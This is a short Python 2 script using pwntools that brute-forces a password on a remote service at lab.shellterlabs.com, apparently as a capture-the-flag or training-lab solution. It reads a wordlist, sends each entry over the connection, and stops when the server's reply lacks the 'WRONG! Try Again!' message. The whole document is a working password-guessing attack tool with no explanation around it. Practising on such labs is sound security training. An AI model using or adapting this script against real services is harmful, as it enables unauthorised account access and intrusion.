#Created by cypherX

from pwn import *
import sys

if len(sys.argv) < 3:
	print "Usage: securelab.py <port_number> <wordlist>"
else:
	r = remote('lab.shellterlabs.com',sys.argv[1])
	print r.recv(1024)
	counter = 0
	for word in open(str(sys.argv[2])):
		r.send(str(word))
		receive = r.recv(1024)
		sys.stderr.writelines("\r{" + str(counter) + "}Password: " + str(word).replace("\n","") + " >> " + str(receive).replace("\n",""))
		counter = counter + 1
		if "WRONG! Try Again!" not in receive:
			print "\n[+]PASSWORD FOUND!!! >> " + str(word)
			break 
